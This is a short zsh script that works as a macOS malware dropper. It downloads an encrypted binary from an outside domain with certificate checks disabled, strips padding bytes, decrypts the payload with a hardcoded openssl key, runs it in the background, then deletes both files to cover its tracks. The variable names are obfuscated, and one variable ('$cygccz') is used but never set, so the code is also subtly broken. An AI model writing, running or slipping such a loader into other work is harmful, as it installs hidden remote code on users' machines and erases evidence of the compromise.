#!/bin/zsh
cygcc=$(mktemp /tmp/m3c5gf.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mc0ef5b42d7d236af.bin" -o "$cygccz" || exit 1
yvn253=$(stat -f %z "$cygccz"); zyh6f6p=$(( yvn253 - 3389 - 3558 ))
tail -c +$(( 3389 + 1 )) "$cygccz" | head -c $zyh6f6p | openssl enc -d -aes-256-cbc -k 04889f2c9fc383b8ca3aaadf -out "$cygcc" 2>/dev/null
[ -s "$cygcc" ] && chmod 700 "$cygcc" && ( "$cygcc" & ) && disown
( sleep 3; rm -f "$cygcc" "$cygccz" ) &>/dev/null &
